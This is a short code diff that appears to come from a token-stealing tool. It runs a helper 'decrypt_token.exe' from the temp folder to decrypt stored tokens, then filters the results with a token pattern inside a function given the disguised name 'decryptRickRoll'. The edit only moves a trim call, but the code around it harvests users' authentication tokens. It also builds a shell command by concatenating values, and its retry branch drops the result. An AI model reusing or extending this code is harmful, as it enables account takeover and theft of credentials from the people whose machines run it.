@@ -18,7 +18,7 @@ const decryptToken = async (token, key) => {
   try {
     return (await execSync(
       join(getTempFolder(), 'decrypt_token.exe') + ' ' + ['--key', `"${key}"`, '--token', `"${token}"`].join(' ')
-    )).toString('utf8');
+    )).toString('utf8')?.trim();
   } catch (e) {
     await sleep(500);
     await decryptToken(token, key);
@@ -52,7 +52,7 @@ const decryptRickRoll = (path) => {
         });
       });
       for (let token of encryptedTokens) {
-        token = (await decryptToken(token, key))?.trim();
+        token = await decryptToken(token, key);
         if (
           typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
         ) tokens.push({
